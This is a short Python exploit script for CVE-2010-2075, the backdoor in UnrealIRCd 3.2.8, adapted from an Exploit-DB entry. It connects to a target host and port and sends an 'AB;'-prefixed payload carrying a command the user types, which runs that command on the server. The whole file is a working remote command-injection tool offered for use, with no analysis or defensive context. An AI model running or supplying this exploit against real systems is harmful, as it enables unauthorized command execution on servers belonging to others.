#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This script exploits CVE-2010-2075 - Unreal IRC 3.2.8 Backdoor
# Based on: https://www.exploit-db.com/exploits/13853/
# This version allows user to specify the command to execute

import socket
import sys

if __name__ == "__main__":

    print("[+] Exploit CVE-2010-2075 -- more info:")
    print("[+] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075")

    if len(sys.argv) < 3:
        print("[!] Usage: python %s <TARGET IP> <TARGET PORT>" % sys.argv[0] )
        raise SystemExit

    ip = sys.argv[1]
    port = int(sys.argv[2])

    if sys.version_info[0] < 3:
        input = raw_input

    shell = input("[+] Enter a command to execute: ")
    payload = bytes(("AB;" + shell + "\n").encode())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))
        s.recv(1024)
        s.send(payload)
        s.recv(1024)
    except Exception as err:
        print("[x] Command injection failed: {}".format(err))
    else:
        print("[+] Command injected successfully!")
    finally:
        s.close()
